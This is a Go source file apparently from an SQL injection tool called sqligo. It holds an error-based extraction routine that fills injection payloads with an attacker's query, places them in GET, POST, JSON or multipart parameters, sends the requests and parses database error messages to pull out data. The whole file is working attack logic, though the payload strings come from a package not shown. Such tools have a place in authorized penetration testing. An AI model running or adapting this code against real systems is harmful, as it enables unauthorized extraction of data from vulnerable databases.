package extractor

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/R0X4R/sqligo/pkg/config"
	"github.com/R0X4R/sqligo/pkg/logger"
	"github.com/R0X4R/sqligo/pkg/payloads"
	"github.com/R0X4R/sqligo/pkg/request"
	"github.com/R0X4R/sqligo/pkg/utils"
)

// ExtractErrorBased attempts to extract data using error-based SQL injection.
// It iterates through available error payloads for the detected backend.
func (e *Extractor) ExtractErrorBased(query string) (string, bool) {
	// 1. Get Error Tests
	errorTests := payloads.GlobalPayloads.ErrorTests["error-based"]
	if len(errorTests) == 0 {
		return "", false
	}

	// 2. Filter for Backend
	var validPayloads []payloads.Payload
	for _, p := range errorTests {
		if strings.EqualFold(p.Dbms, e.Backend) {
			validPayloads = append(validPayloads, p)
		}
	}

	if len(validPayloads) == 0 {
		return "", false
	}

	// 3. Compile Regexes
	var regexList []*regexp.Regexp
	for _, regStr := range payloads.ErrorRegexes {
		re, err := regexp.Compile(regStr)
		if err == nil {
			regexList = append(regexList, re)
		}
	}

	// 4. Try Payloads
	for _, p := range validPayloads {
		// Construct the injection payload
		// Vector contains [INFERENCE] which we replace with the query
		vector := strings.ReplaceAll(p.Vector, "[INFERENCE]", query)

		// Iterate through comments/suffixes to close the syntax
		// Iterate through comments/suffixes to close the syntax
		for _, comment := range p.Comments {
			// Apply Prefix/Suffix
			pref := comment.Pref
			if config.GlobalConfig != nil && config.GlobalConfig.Prefix != "" {
				pref = config.GlobalConfig.Prefix + pref
			}
			suf := comment.Suf
			if config.GlobalConfig.Suffix != "" { // Config.GlobalConfig != nil check implied or we just check
				suf = suf + config.GlobalConfig.Suffix
			}
			fullPayload := pref + vector + suf

			// Perform Injection
			// We need to inject this into the parameter.
			// Currently, Extractor stores e.Parameter which is the *name* of the param?
			// Or is it the injection marker?
			// In blind.go: strings.Replace(e.Data, e.Parameter+"=", e.Parameter+"="+val+payload, 1)
			// Let's assume we append to the value.

			// Simple injection strategy: replace the specific parameter value in Url or Data
			var targetURL string
			var targetData string

			// Logic to inject at the correct place.
			// Reuse logic from blind.go or generic approach.
			// For now, let's assume valid injection is appending.

			// NOTE: Robust parameter replacement logic is needed here.
			// blind.go implementation:
			// if e.Data != "" {
			//      parts := strings.Split(e.Data, "&")
			//      ... logic to find e.Parameter and append payload ...
			// }

			// Let's copy a simplified version of that helper or refactor it later.
			// We'll perform the injection directly here for now.

			req := request.NewRequest(e.Url)

			if e.Data != "" {
				// POST injection
				targetData = e.Data
				// Use robust injection (Parity with blind.go)
				if config.GlobalConfig.IsJson {
					targetData = strings.Replace(e.Data, fmt.Sprintf(`"%s": "`, e.Parameter), fmt.Sprintf(`"%s": "`, e.Parameter)+utils.UrlEncode(fullPayload), 1)
				} else if config.GlobalConfig.IsMultipart {
					targetData = utils.ReplaceMultipartValue(e.Data, e.Parameter, "1"+utils.UrlEncode(fullPayload))
				} else {
					if strings.Contains(targetData, e.Parameter+"=") {
						targetData = strings.Replace(targetData, e.Parameter+"=", e.Parameter+"=1"+fullPayload, 1)
					}
				}
				req.Data = targetData
			} else {
				// GET injection
				targetURL = e.Url
				if strings.Contains(targetURL, e.Parameter+"=") {
					// Robust replace
					re := regexp.MustCompile(regexp.QuoteMeta(e.Parameter) + `=[^&]*`)
					targetURL = re.ReplaceAllString(e.Url, e.Parameter+"=1"+utils.UrlEncode(fullPayload))
				} else {
					// Append
					sep := "?"
					if strings.Contains(targetURL, "?") {
						sep = "&"
					}
					targetURL = targetURL + sep + e.Parameter + "=1" + utils.UrlEncode(fullPayload)
				}
				req.Url = targetURL
			}

			// Execute
			resp, err := req.Execute()
			if err != nil {
				continue
			}

			// Check Regex
			for _, re := range regexList {
				matches := re.FindStringSubmatch(resp.Body)
				if len(matches) > 1 {
					// Index 1 is usually the group we want based on (?P<result>...) which is named but Go index is by position
					// The regexes use named groups but Get specific index is easier if we know the structure.
					// Most have 1 capturing group for the result.
					result := matches[len(matches)-1] // Take the last captured group which is likely the result

					// Some regexes capture the quote or delimiter too.
					// The 'result' group is what we want.
					// Let's trust the last submatch is the most specific inner group.

					// Clean up the result
					if result != "" {
						logger.Success("Error-Based Injection Successful: %s", result)
						return result, true
					}
				}
			}
		}
	}

	return "", false
}
